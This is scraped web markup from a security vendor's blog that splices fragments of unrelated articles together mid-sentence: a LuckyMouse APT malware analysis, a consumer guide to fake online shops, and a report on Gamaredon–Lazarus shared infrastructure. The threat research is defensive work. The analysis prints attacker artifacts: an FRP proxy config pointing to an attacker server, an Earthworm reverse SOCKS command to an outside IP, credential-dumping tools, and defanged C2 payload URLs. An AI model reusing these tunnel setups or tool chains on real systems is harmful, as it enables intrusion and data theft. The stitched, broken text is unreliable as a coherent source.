2x" media="(min-width: 720px)"/><source Encryption key computation" class="mantine-q24tb8"/></picture><div class="mantine-Text-root picture-caption mantine-rpndsl">Figure 8: Encryption key computation</div></div><div class="RichText_wrapper__xZRh7"><p>The sample checks for a proxy configured on the system found in the Registry Key <em>Software\Microsoft\Windows\CurrentVersion\Internet Settings\ProxyEnable. </em>If a proxy is configured it uses the server specified in <em>Software\Microsoft\Windows\CurrentVersion\Internet Settings\ProxyServer </em>for all the connections.&nbsp;</p><h4><strong>Polpo – Functionality</strong></h4><p>There are more than 15 commands supported by the backdoor, although some of them are duplicates. Most of the commands are executed in separate threads. Errors and inter-thread communication are handled using Events.</p></div><div class="mantine-Container-root mantine-1yr9cmk"><picture id="the-picture"><source srcSet="https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_large/public/2024-06/pasted%20image%200-7.png.webp?itok=EfleUvKw 1x, https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_large_2x/public/2024-06/pasted%20image%200-7.png.webp?itok=UimwT7KX 2x" media="(min-width: 1020px)"/><source srcSet="https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_medium/public/2024-06/pasted%20image%200-7.png.webp?itok=sqH5Yclc 1x, https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_medium_2x/public/2024-06/pasted%20image%200-7.png.webp?itok=R1bXF2Qg 2x" media="(min-width: 720px)"/><source Command dispatcher" class="mantine-q24tb8"/></picture><div class="mantine-Text-root picture-caption mantine-rpndsl">Figure 9: Command dispatcher</div></div><div class="RichText_wrapper__xZRh7"><p>These commands are supported by the version of Polpo we’ve analyzed:</p></div><div class="mantine-Container-root mantine-1yr9cmk"><picture id="the-picture"><source srcSet="https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_large/public/2024-06/Screenshot%202024-06-24%20at%2011.19.56%E2%80%AFAM.png.webp?itok=CxcppXdt 1x, media="(min-width: 420px)"/><img src="https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_small/public/2024-06/Screenshot%202024-06-24%20at%2011.19.56%E2%80%AFAM.png.webp?itok=q3FiikHL" width="100%" height="unset" alt="" class="mantine-q24tb8"/></picture></div><div class="RichText_wrapper__xZRh7"><h2><strong>UAC bypass tool</strong></h2><p>An open-source UAC bypass tool (<a href="https://github.com/vestjoe/WinPwnage#uac-bypass-techniques">https://github.com/vestjoe/WinPwnage</a>) was detected on several compromised devices. It may be used to elevate privileges or achieve persistence on the system. We presume that it was used to execute tasks and programs under administrator-level permissions.&nbsp;</p><h2><strong>Port-scanners</strong></h2><p>Several different port scanners were seen on compromised devices under various filenames. One of the used port scanners was open-source <a href="https://github.com/kingron/s">https://github.com/kingron/s</a>. We assume that in this case it was used for scanning the ports of the server to find out which services were running.</p><h2><strong>Nbtscan</strong></h2><p>Nbtscan is a command-line NetBIOS scanner for Windows that scans for open NetBIOS name servers in the network.</p><h2><strong>Passwords dumpers</strong></h2><p><a href="https://github.com/gentilkiwi/mimikatz">Mimikatz</a> and <a href="https://github.com/AlessandroZ/LaZagne">Lazagne</a> were seen on the infected computers. We presume that they were used to retrieve credentials from the compromised computers. We’ve also spotted a wrapped Mimikatz version, download from <a href="https://github.com/jas502n/mimikat_ssp">https://github.com/jas502n/mimikat_ssp</a>, on several compromised devices.</p><h2><strong>FRP</strong></h2><p>Fast Reverse Proxy (FRP) is a tool that allows you to expose local services that are hidden behind the NAT or a firewall to the internet. Both the raw TCP and UDP are supported as well as several other protocols whose requests can be forwarded to the internal services via this proxy. We’ve recovered a configuration file <em>3bef4cd.tmp</em> for this proxy. The content of this proxy is the following:</p><p>[common]<br>server_addr = 202.59.9[.]58<br>server_port = 8443<br>privilege_token = %token%<br>[SDJY_proxy]<br>type = tcp<br>remote_port = 6001<br>plugin = socks5</p><p>It is immediately obvious that the actor used the SOCKS5 plugin to route requests to the compromised network via 202.59.9[.]58:8443.</p></div><div class="mantine-Container-root mantine-1yr9cmk"><picture id="the-picture"><source srcSet="https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_large/public/2024-06/FRP_graph.png.webp?itok=FlbsrLM4 1x, https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_large_2x/public/2024-06/FRP_graph.png.webp?itok=u929aPYO 2x" media="(min-width: 1020px)"/><source srcSet="https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_medium/public/2024-06/FRP_graph.png.webp?itok=RRBnM_h8 1x, https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_medium_2x/public/2024-06/FRP_graph.png.webp?itok=krp3kRkN 2x" media="(min-width: 720px)"/><source srcSet="https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_small/public/2024-06/FRP_graph.png.webp?itok=pdFuuMia 1x, https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_small_2x/public/2024-06/FRP_graph.png.webp?itok=rrfPYi2N 2x" media="(min-width: 420px)"/><img src="https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_small/public/2024-06/FRP_graph.png.webp?itok=pdFuuMia" width="100%" height="unset" alt="Figure 10: Diagram of FRP tool usage" class="mantine-q24tb8"/></picture><div class="mantine-Text-root picture-caption mantine-rpndsl">Figure 10: Diagram of FRP tool usage</div></div><div class="RichText_wrapper__xZRh7"><h2><strong>Earthworm tunneler</strong></h2><p>The Earthworm tunneler is considered to be a typical tool for Chinese-speaking actors by Kaspersky[1]. We’ve seen this tool on all compromised systems of national data center. On one of these devices, we’ve managed to recover command-line parameters that were used:&nbsp; <em>-s rssocks -d 139.180.155.133 -e 80</em>. The tool itself creates a SOCKS tunnel to the provided server. It is publically available at <a href="http://rootkiter.com/EarthWorm/">http://rootkiter.com/EarthWorm/</a>.</p><h2><strong>Conclusions</strong></h2><p>As this blogpost demonstrates, LuckyMouse has used new methods to infiltrate the government institution through a third party’s system which they attacked.&nbsp;</p><p>Avast has recently protected users in the government institution and national data center from further attacks using the samples we analyzed. We also discovered an interesting encryption method that delivers a hidden IP address in the whitespace of the C&amp;C response. We presume that the attackers updated their attacking toolset in this campaign after it was discovered by Avast.</p><p>I would like to thank Adolf Středa, David Zimmer and Anh Ho for helping me with this research.</p><h2><strong>Indicators of Compromise (IoC)</strong></h2><ul><li>&nbsp;Repository:&nbsp;<a href="https://github.com/avast/ioc/tree/master/LuckyMouse">https://github.com/avast/ioc/tree/master/</a></li><li> List of SHA-256:&nbsp;<a href="https://github.com/avast/ioc/blob/master/LuckyMouse/samples.sha256">https://github.com/avast/ioc/blob/master/</a></li></ul><h2><strong>MITRE ATT&amp;CK techniques</strong></h2></div><div We consider with moderate confidence based on our research that the chinese-speaking APT group LuckyMouse is behind the attack.\u0026nbsp;\u003c/p\u003e\u003cp\u003eThe APT group planted backdoors and keyloggers to gain long-term access to government networks and then uploaded a variety of tools that they used to perform additional activities on the compromised network such as scanning of the local network and dumping credentials. We presume that the main aim of cyber-espionage was the exfiltration of sensitive data from potentially interesting government agencies.\u003c/p\u003e\u003cp\u003eAccording to our local telemetries, we consider that the government institutions were attacked in two ways. One was through a vulnerable company who is providing services for these agencies, and the other was through an email spear-phishing with a malicious attachment – a weaponized document using CVE-2017-11882.\u0026nbsp;\u003c/p\u003e\u003cp\u003eThere are many tactics that are consistent with other reports of LuckyMouse; nevertheless, we are also seeing some previously undocumented tactics indicating that the actors have updated their toolset with Polpo and LuckyBack backdoors. Our analysis below will highlight those new tactics.\u0026nbsp;\u003c/p\u003e\u003cp\u003e\u003cstrong\u003eAttribution \u0026amp; Clusterization\u003c/strong\u003e\u003c/p\u003e\u003cp\u003eWe base our presumption that this campaign was led by the LuckyMouse APT group on the tooling that we found during the investigation of this campaign, most of them having previously been attributed to LuckyMouse by other researchers[\u003ca href=\"https://securelist.com/luckymouse-hits-national-data-center/86083/\"\u003e1\u003c/a\u003e][\u003ca href=\"https://securelist.com/luckymouse-ndisproxy-driver/87914/\"\u003e2\u003c/a\u003e][\u003ca href=\"https://unit42.paloaltonetworks.com/emissary-panda-attacks-middle-east-government-sharepoint-servers/\"\u003e3\u003c/a\u003e].\u003c/p\u003e\u003cp\u003eIn 2018, Kaspersky Labs released two blog posts about LuckyMouse targeting a national data center containing Asian government resources. Their blog posts described several tool sets such as network filtering driver NDISProxy, weaponized documents with CVE-2017-11882 (Microsoft Office Equation Editor, widely used by Chinese-speaking actors), and Earthworm tunneler. They also described a DLL sideloading technique abusing legitimate applications from Symantec (\u003cem\u003eIntgStat.exe\u003c/em\u003e). This is a legitimate application that loads a DLL \u003cem\u003epcalocalresloader.dll\u003c/em\u003e. By sideloading their own version \u003cem\u003epcalocalresloader.dll\u003c/em\u003e, they load HyperBro RAT from a compressed and encrypted file\u003cem\u003e thumbs.db\u003c/em\u003e. While some of the tools that were used were publicly known tools that are available on the internet, the group also developed their own tools, including a rootkit[\u003ca href=\"https://securelist.com/luckymouse-hits-national-data-center/86083/\"\u003e1\u003c/a\u003e][\u003ca href=\"https://securelist.com/luckymouse-ndisproxy-driver/87914/\"\u003e2\u003c/a\u003e].\u003c/p\u003e\u003cp\u003eIn April 2019, PaloAlto Networks released a blogpost about LuckyMouse. According to the post, the group installed webshells on a SharePoint server to compromise Government Organizations in the Middle East. Similarly, the group used several publicly known and available tools (such as mimikatz, curl, ntbscan). But what got our attention was the fact that the same HyperBro RAT was used in the campaign we were analyzing. The APT attack we analyzed also used a DLL sideloading technique, although with different executables. The executable used was a Symantec application \u003cem\u003ethinprobe.exe\u003c/em\u003e that loads \u003cem\u003ethinhostprobedll.dll\u003c/em\u003e. This DLL was then used to sideload \u003cem\u003ethumb.db\u003c/em\u003e that contained encrypted and compressed HyperBro[\u003ca href=\"https://unit42.paloaltonetworks.com/emissary-panda-attacks-middle-east-government-sharepoint-servers/\"\u003e3\u003c/a\u003e].\u003c/p\u003e\u003cp\u003eWe’ve also discovered a Polpo backdoor in the network belonging to the National Data Center of Mongolia. This backdoor was accompanied by samples that are known to be used by the LuckyMouse group which lead us to the conclusion that this backdoor is a new addition into LuckyMouse’s toolkit. We also observed more common tools, e.g. VMProtect-obfuscated Earthworm tunneler, a custom installer dropping NDISProxy network filtering driver, and various network scanners.\u003c/p\u003e\u003cp\u003e\u003cstrong\u003eInfection Chain\u003c/strong\u003e\u003c/p\u003e\u003cp\u003eWe observed that this APT group was also targeting an unknown company that was providing services to government institutions in East Asia. The group infiltrated the company’s computers and managed to harvest credentials belonging to the company’s email accounts. Unfortunately, we haven’t been able to identify which attack vector was used in this infiltration. These credentials were then used to send emails from the hacked company’s email accounts to the government officials. While we were unable to recover the whole email, we’ve managed to recover the email’s header. The header indicates that these emails were asking the recipient to update a firmware, i.e. launch a self-extracting 7-zip archive attached to this email.\u003c/p\u003e\u003cp\u003eDate: Sun, 28 Jun 2020 20:43:08 +0800 (ULAT)\u0026nbsp;\u003cbr\u003eSubject: Re: Perform a firmware update on the server\u003c/p\u003e\u003cp\u003eXXXXXX_update.exe\u0026nbsp;\u003c/p\u003e\u003cp\u003e(sha256:2D2EA3002C367684F21AD08BDC9B5079EBDEE08B6356AC5694EFA139D4C6E60D)\u003c/p\u003e\u003cp\u003eThis archive drops three already familiar files – Symantec’s \u003cem\u003ethinprobe.exe\u003c/em\u003e, malicious \u003cem\u003ethinhostprobedll.dll\u003c/em\u003e, and \u003cem\u003ethumb.db\u003c/em\u003e. The malicious DLL is used for DLL sideloading, decrypting and decompressing \u003cem\u003ethumb.db\u003c/em\u003e and finally loading its processed content – a HyperBro RAT . This backdoor has also been reported on by \u003ca href=\"https://securelist.com/luckymouse-hits-national-data-center/86083/\"\u003eKaspersky[1]\u003c/a\u003e and \u003ca Every directory from the list is searched for files with a given file extension. If such files are found and their modification date is within the provided date boundaries (in UTC), their full paths are written down into the output file. These paths are delimited by Windows line delimiters and they are encoded in 16-bit Unicode.\u003c/p\u003e\u003cp\u003eBelow you will see a part of an error message, providing us the information about how this utility is used:\u003c/p\u003e\u003cp\u003e\u003cem\u003eT040ClientLite.exe suffix .txt,.xls scanDirs E:\\\\test,E:\\\\test1 output E:\\\\test\\\\output.txt startEditDate 2020/04/26 endEditDate 2020/04/27\u003c/em\u003e\u003c/p\u003e\u003cp\u003eMore generally, the command’s format is:\u003c/p\u003e\u003cp\u003e\u003cem\u003eT040ClientLite.exe suffix \u0026lt;file extensions\u0026gt; scanDirs \u0026lt;directories\u0026gt; output \u0026lt;output file\u0026gt; startEditDate \u0026lt;date\u0026gt; endEditDate \u0026lt;date\u0026gt;\u003c/em\u003e\u003c/p\u003e\u003ch2\u003e\u003cstrong\u003eInformation Collector\u003c/strong\u003e\u003c/h2\u003e\u003cp\u003eThe Information Collector focuses on removable drives. If no such drives are connected, its execution is terminated. The collector fingerprints those drives (serial number, vendor ID, product ID), encrypts this data with a 64 byte XOR key, and stores it onto the system drive as hidden files. fake shops fake trust\u0026nbsp;\u003c/h2\u003e\u003cp\u003eModern fake shops are not just about flashy discounts. They are designed to look legitimate at a glance.\u0026nbsp;\u003c/p\u003e\u003cp\u003eMany use polished templates and SSL certificates, so the little padlock icon appears in the browser. That padlock only means the connection is encrypted, not that the site is honest, but scammers know people trust it.\u0026nbsp;\u003c/p\u003e\u003cp\u003eSome fake shops seed third party review platforms with positive reviews to boost their scores. In our analysis we saw cases where those reviews were later removed by the platform for breaking guidelines, a strong sign they were fake. In at least one case, the scam site ran on a subdomain of an older, existing site and showed Black Friday deals alongside those disputed reviews. Piggybacking on an established domain is another way to look more credible.\u0026nbsp;\u003c/p\u003e\u003cp\u003eOn social media, scammers run ads that look like any other promotion in your feed. They often target specific demographics, interests or locations, and in some cases even reply to comments or reviews to keep up the illusion of a real business.\u0026nbsp;\u003c/p\u003e"},{"bundle":"image","images":[{"sources":[{"srcset":"https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_large/public/2025-12/removed_reviews.png.webp?itok=QLUIVc2J 1x, https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_large_2x/public/2025-12/removed_reviews.png.webp?itok=agIb8F8t 2x","media":"(min-width: 1020px)","type":"image/webp","width":1170,"height":1310},{"srcset":"https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_medium/public/2025-12/removed_reviews.png.webp?itok=-_5gWcKZ 1x, https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_medium_2x/public/2025-12/removed_reviews.png.webp?itok=hes3V86N 2x","media":"(min-width: 720px)","type":"image/webp","width":890,"height":997},{"srcset":"https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_small/public/2025-12/removed_reviews.png.webp?itok=-ziiI-sN 1x, https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_small_2x/public/2025-12/removed_reviews.png.webp?itok=376uSf7c 2x","media":"(min-width: 420px)","type":"image/webp","width":690,"height":773}],"caption":"","url":"https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_small/public/2025-12/removed_reviews.png.webp?itok=-ziiI-sN","link":""}]},{"bundle":"rich_text","content":"\u003ch2\u003eHow to Spot a Fake Online Shop\u0026nbsp;\u003c/h2\u003e\u003cp\u003eThere is no single trick that catches every scam, but a few simple habits can dramatically lower the risk:\u0026nbsp;\u003c/p\u003e\u003col\u003e\u003cli\u003e\u003cstrong\u003eCheck the address bar, not just the logo. \u003c/strong\u003eLook closely at the URL. Watch out for strange spellings, extra words, or domains that do not match the brand name you expect.\u003c/li\u003e\u003cli\u003e\u003cstrong\u003eBe skeptical of “too good to be true” discounts\u003c/strong\u003e. Genuine retailers do run big Black Friday sales, but if a high demand product is half the usual price, treat it as suspicious.\u003c/li\u003e\u003cli\u003e\u003cstrong\u003eVerify reviews\u003c/strong\u003e.\u003cstrong\u003e \u003c/strong\u003eDo not rely only on the testimonials shown on the shop itself. Search the store name together with words like \"reviews\", \"scam\" or \"complaints\". Be wary if you only find a handful of overly positive comments.\u003c/li\u003e\u003cli\u003e\u003cstrong\u003eCheck contact and return information. \u003c/strong\u003eLegitimate shops make it easy to see who they are and how to reach them, for example a physical address, company name, clear return policy, and real customer service options. Vague contact details or only a web form are warning signs.\u003c/li\u003e\u003cli\u003e\u003cstrong\u003eUse security tools and safer payment methods. \u003c/strong\u003eEnable browser protection and make sure your security solutions are on so known scam domains are blocked before you land on them. When you pay, prefer options that offer buyer protection, such as credit card or trusted payment service, and avoid bank transfers, gift cards or cryptocurrency for online purchases.\u0026nbsp;\u003c/li\u003e\u003c/ol\u003e\u003cp\u003eScammers treat Black Friday, Cyber Monday and the entire holiday shopping season as a business opportunity. They use the same tools, platforms and marketing channels as legitimate stores, just with a very different goal.\u0026nbsp;\u003c/p\u003e\u003cp\u003eThe good news is that you do not need to stop shopping online to stay safe. A bit of skepticism, a habit of checking before you click, and the right security tools in the background will go a long way to keep your money and data out of their hacking groups typically operate in isolation, each advancing its own nation’s goals. That’s why any sign of collaboration between them is cause for concern. Yet new evidence uncovered by Gen researchers suggests that two of the world’s most aggressive advanced persistent threat (APT) actors, Russia-aligned Gamaredon and North Korea’s Lazarus, may be operating on shared infrastructure.\u0026nbsp;\u0026nbsp;\u003c/p\u003e\u003cp\u003eThis discovery hints at something much bigger than mere technical overlap. It points to a possible new stage in cyber conflict, where geopolitical alliances are mirrored in shared digital operations.\u0026nbsp;\u0026nbsp;\u003c/p\u003e\u003ch2\u003eFrom allies on the battlefield to partners online\u0026nbsp;\u003c/h2\u003e\u003cp\u003eRussia and North Korea have maintained a long-standing partnership rooted in shared political and military interests. Moscow backed Pyongyang during and after the Korean War, and in 2024 both nations renewed that alliance through a Comprehensive Strategic Partnership that includes mutual defense commitments.\u0026nbsp;\u003c/p\u003e\u003cp\u003eSince 2022, Pyongyang has stepped up its support for Moscow, formally recognizing Russian-claimed territories in Ukraine and reportedly supplying munitions and troops. In 2024, Reuters reported that North Korean soldiers had been deployed to fight alongside Russian forces in Ukraine, a striking example of the two countries’ deepening cooperation.\u0026nbsp;\u003c/p\u003e\u003cp\u003eNow, we may be witnessing a digital extension of that alliance. On July 28, 2025, Gen’s internal monitoring systems detected a suspicious event linking \u003cstrong\u003eGamaredon\u003c/strong\u003e and \u003cstrong\u003eLazarus\u003c/strong\u003e activity through a shared IP address. The implications are significant: two state-backed actors from different countries may be coordinating at an operational level.\u0026nbsp;\u003c/p\u003e\u003cp\u003eThis development aligns with broader patterns highlighted in the \u003ca href=\"https://www.gendigital.com/blog/insights/reports/threat-report-q3-2025\" target=\"_blank\" rel=\"noreferrer noopener\"\u003eQ3/2025 Threat Report\u003c/a\u003e, where state sponsored operations showed increasing sophistication, coordination, and diversification of infrastructure. While those observations were confined within national ecosystems, the Gamaredon–Lazarus overlap suggests that similar dynamics may now be emerging across national boundaries.\u0026nbsp;\u003c/p\u003e\u003ch2\u003eBackground\u0026nbsp;\u003c/h2\u003e\u003ch3\u003eGamaredon\u0026nbsp;\u003c/h3\u003e\u003cp\u003e\u003cstrong\u003eGamaredon \u003c/strong\u003eis a Russian-aligned APT active since at least 2013, primarily focused on cyber espionage. In 2021, the Security Service of Ukraine issued a \u003ca href=\"https://ssu.gov.ua/en/novyny/sbu-vstanovyla-khakeriv-fsb-yaki-zdiisnyly-ponad-5-tys-kiberatak-na-derzhavni-orhany-ukrainy\" target=\"_blank\" rel=\"noreferrer noopener\"\u003epress release\u003c/a\u003e, attributing several members of the group as part of Russia's Federal Security Service (FSB) 18th Information Security Center. Since its official inception, the group is believed to have conducted more than 5000 cyber-attacks, most of which targeted Ukrainian government agencies. However, with the onset of war in Ukraine, ESET \u003ca href=\"https://www.welivesecurity.com/en/eset-research/cyberespionage-gamaredon-way-analysis-toolset-used-spy-ukraine-2022-2023/\" target=\"_blank\" rel=\"noreferrer noopener\"\u003ereported\u003c/a\u003e that Gamaredon expanded its operations to include NATO member states, likely aiming to disrupt military aid to Ukraine, underscoring the group’s prioritization of hybrid warfare.\u0026nbsp;\u003c/p\u003e\u003ch3\u003eLazarus\u0026nbsp;\u003c/h3\u003e\u003cp\u003e\u003cstrong\u003eLazarus \u003c/strong\u003eis a state-sponsored threat actor active since 2009 and widely believed to operate under North Korea’s government. Initially focused on cyber espionage and destructive attacks, Lazarus later shifted toward financially motivated operations to fund future campaigns. In 2021, the United States Department of Justice \u003ca href=\"https://www.justice.gov/archives/opa/pr/north-korean-regime-backed-programmer-charged-conspiracy-conduct-multiple-cyber-attacks-and\" target=\"_blank\" rel=\"noreferrer noopener\"\u003eindicted\u003c/a\u003e three members believed to be part of the Lazarus group, connecting them to North Korea’s Reconnaissance General Bureau (RGB), the country’s primary intelligence agency. With the rise of cryptocurrency, Lazarus increasingly targeted digital assets, as evidenced by high-profile breaches such as \u003ca href=\"https://www.fbi.gov/news/press-releases/fbi-identifies-lazarus-group-cyber-actors-as-responsible-for-theft-of-41-million-from-stakecom\" target=\"_blank\" rel=\"noreferrer noopener\"\u003eStake.com\u003c/a\u003e ($41 million), \u003ca href=\"https://www.fbi.gov/news/press-releases/fbi-identifies-cryptocurrency-funds-stolen-by-dprk\" target=\"_blank\" rel=\"noreferrer noopener\"\u003eAtomicWallet\u003c/a\u003e ($100 million), \u003ca href=\"https://www.businesstoday.in/technology/news/story/wazirx-hacked-north-korean-hackers-behind-235-million-theft-from-indian-investors-report-reveals-439240-2024-07-29\" target=\"_blank\" rel=\"noreferrer noopener\"\u003eWazirX\u003c/a\u003e ($235 million), and \u003ca href=\"https://neobanque.ch/blog/bybit-1-4-billion-hack-lazarus-group-2025/\" target=\"_blank\" rel=\"noreferrer noopener\"\u003eBybit\u003c/a\u003e ($1.4 billion).\u0026nbsp;\u003c/p\u003e\u003cp\u003eWhere \u003cstrong\u003eGamaredon spies, Lazarus steals\u003c/strong\u003e, but both ultimately serve their governments’ strategic interests.\u0026nbsp;\u003c/p\u003e\u003ch3\u003eThe discovery: a shared digital footprint\u0026nbsp;\u003c/h3\u003e\u003cp\u003eJust one day after the \u003ca href=\"https://www.reuters.com/business/aerospace-defense/russia-starts-first-moscow-pyongyang-passenger-flights-decades-2025-07-27/\" target=\"_blank\" rel=\"noreferrer noopener\"\u003eannouncement\u003c/a\u003e of new direct flights between Moscow and Pyongyang, Gen identified indicators of a potential collaboration between the Gamaredon and Lazarus APTs. On July 24, 2025, our system tracking Gamaredon’s Command-and-Control (C2) servers via known Telegram and Telegraph channels blocked an IP address:\u0026nbsp;\u003c/p\u003e\u003cp\u003e144[.]172[.]112[.]106\u0026nbsp;\u003c/p\u003e"},{"bundle":"image","images":[{"sources":[{"srcset":"https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_large/public/2025-11/1.png.webp?itok=9QhO-lvd 1x, https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_large_2x/public/2025-11/1.png.webp?itok=9cTN8qMb 2x","media":"(min-width: 1020px)","type":"image/webp","width":647,"height":27},{"srcset":"https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_medium/public/2025-11/1.png.webp?itok=Xhx1_gKk 1x, https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_medium_2x/public/2025-11/1.png.webp?itok=PS7yGsb1 2x","media":"(min-width: 720px)","type":"image/webp","width":647,"height":27},{"srcset":"https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_small/public/2025-11/1.png.webp?itok=TFWMla6Q 1x, https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_small_2x/public/2025-11/1.png.webp?itok=rs0aLUYf 2x","media":"(min-width: 420px)","type":"image/webp","width":647,"height":27}],"caption":"","url":"https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_small/public/2025-11/1.png.webp?itok=TFWMla6Q","link":""}]},{"bundle":"rich_text","content":"\u003cp\u003eFour days later, during a routine check, the same server was found hosting an obfuscated version of \u003cstrong\u003eInvisibleFerret \u003c/strong\u003e(SHA256: `128da948f7c3a6c052e782acfee503383bf05d953f3db5c603e4d386e2cf4b4d`), a malware strain attributed to \u003cstrong\u003eLazarus\u003c/strong\u003e. The payload matched Lazarus’ tooling and was delivered through an identical server structure (URL: `http[://]144[.]172[.]112[.]106/payload/99/81`) previously seen in \u003cem\u003eContagiousInterview\u003c/em\u003e, a Lazarus campaign that targeted job seekers with fake recruitment messages. While the IP could represent a proxy or VPN endpoint, the temporal proximity of both groups’ activity and the shared hosting pattern indicate probable infrastructure reuse, with moderate confidence of operational collaboration. Whether Lazarus leveraged a Gamaredon-controlled server or both actors shared the same client instance remains unclear, but the overlap is too close to ignore.\u0026nbsp;\u0026nbsp;\u003c/p\u003e\u003ch2\u003eImplications for the global threat landscape\u0026nbsp;\u003c/h2\u003e\u003cp\u003eCross-country collaborations in the APT ecosystem remain exceptionally rare. The last widely acknowledged example dates back to 2014 with the \u003ca href=\"https://theintercept.com/2014/11/24/secret-regin-malware-belgacom-nsa-gchq/\" target=\"_blank\" rel=\"noreferrer noopener\"\u003eRegin\u003c/a\u003e malware, reportedly co-developed by the U.S. National Security Agency (NSA) and the U.K.’s Government Communications Headquarters (GCHQ).\u0026nbsp;\u003c/p\u003e\u003cp\u003eIf confirmed, the Gamaredon–Lazarus overlap would represent the first known case of \u003cstrong\u003eRussian–North Korean cyber collaboration\u003c/strong\u003e in the wild.\u0026nbsp;\u003c/p\u003e\u003cp\u003eSuch a partnership could have wide-ranging implications:\u0026nbsp;\u003c/p\u003e\u003cul\u003e\u003cli\u003e\u003cstrong\u003eOperational synergy:\u003c/strong\u003e Lazarus’s expertise in monetizing cyberattacks through cryptocurrency theft could help Gamaredon fund or conceal future operations.\u003c/li\u003e\u003cli\u003e\u003cstrong\u003eStrategic alignment:\u003c/strong\u003e Russia, facing mounting economic and military pressure, could benefit from North Korea’s established infrastructure for covert financial operations.\u003c/li\u003e\u003cli\u003e\u003cstrong\u003eEscalation potential:\u003c/strong\u003e This kind of collaboration blurs the line between espionage, sabotage, and organized cybercrime, expanding both nations’ offensive reach.\u0026nbsp;\u003c/li\u003e\u003c/ul\u003e\u003ch2\u003eNot an isolated case: national ecosystems are merging\u0026nbsp;\u003c/h2\u003e\u003cp\u003eWhile cross-border APT collaboration is rare, cooperation within national ecosystems has become increasingly common.\u0026nbsp;\u003c/p\u003e\u003ch3\u003eLazarus x Kimsuky\u0026nbsp;\u003c/h3\u003e\u003cp\u003e\u003cstrong\u003eKimsuky \u003c/strong\u003eis another North Korean APT group. It has been active since around 2012 and assessed by \u003ca href=\"https://cloud.google.com/blog/topics/threat-intelligence/mapping-dprk-groups-to-government\" target=\"_blank\" rel=\"noreferrer noopener\"\u003eMandiant\u003c/a\u003e to operate under the RGB. The group specializes in advanced cyber-espionage campaigns, primarily targeting government entities and consumer-facing organizations.\u0026nbsp;\u003c/p\u003e\u003cp\u003eDuring analysis of Lazarus’ \u003cem\u003eContagiousInterview\u003c/em\u003e payloads, Gen researchers found that an IP address (216[.]219[.]87[.]41) later reappeared in Kimsuky-linked payloads (e.g., cce27340fd6f32d96c65b7b1034c65d5026d7d0b96c80bcf31e40ab4b8834bcd). This suggests infrastructure reuse or coordination between RGB units, evidence of alignment at North Korea’s national level.\u0026nbsp;\u003c/p\u003e\u003ch3\u003eDoNot x SideWinder\u0026nbsp;\u003c/h3\u003e\u003cp\u003e\u003ca href=\"https://www.amnesty.org/en/latest/news/2021/10/togo-activist-targeted-with-spyware-by-notorious-hacker-group/\" target=\"_blank\" rel=\"noreferrer noopener\"\u003e\u003cstrong\u003eDoNot\u003c/strong\u003e\u003c/a\u003e\u003cstrong\u003e \u003c/strong\u003eand \u003ca href=\"https://cdn-cybersecurity.att.com/docs/global-perspective-of-the-sidewinder-apt.pdf\" target=\"_blank\" rel=\"noreferrer noopener\"\u003e\u003cstrong\u003eSideWinder\u003c/strong\u003e\u003c/a\u003e\u003cstrong\u003e \u003c/strong\u003eare state-sponsored APT groups believed to have been active since 2013 and 2012, respectively, both with ties to the Indian government and a primary focus on cyber espionage.\u0026nbsp;\u003c/p\u003e\u003cp\u003eGen identified a DoNot-attributed payload (8bb089d763d5d4b4f96ae59eb9d8f919e6a49611c183f636bfd5c01696447938) that later executed a known SideWinder loader (f4d10604980f8f556440460adc71883f04e24231d0a9a3a323a86651405bedfb). The victim was located in Pakistan, consistent with the typical targeting profile of both groups. This cooperation resembles the previously observed \u003ca href=\"https://www.eset.com/us/about/newsroom/research/eset-research-gamaredon-and-turla-target-high-profile-ukrainian-entities/\" target=\"_blank\" rel=\"noreferrer noopener\"\u003eGamaredon x Turla collaboration\u003c/a\u003e, indicating that intra-country partnerships are becoming a tactical norm.\u0026nbsp;\u0026nbsp;\u003c/p\u003e"},{"bundle":"image","images":[{"sources":[{"srcset":"https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_large/public/2025-11/2.png.webp?itok=PJ1o3S2B 1x, https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_large_2x/public/2025-11/2.png.webp?itok=PGU1pkoD 2x","media":"(min-width: 1020px)","type":"image/webp","width":1170,"height":110},{"srcset":"https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_medium/public/2025-11/2.png.webp?itok=IpB38Hws 1x, https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_medium_2x/public/2025-11/2.png.webp?itok=T1EXtOjj 2x","media":"(min-width: 720px)","type":"image/webp","width":890,"height":84},{"srcset":"https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_small/public/2025-11/2.png.webp?itok=GAkzCR6x 1x, https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_small_2x/public/2025-11/2.png.webp?itok=dLXf-fFt 2x","media":"(min-width: 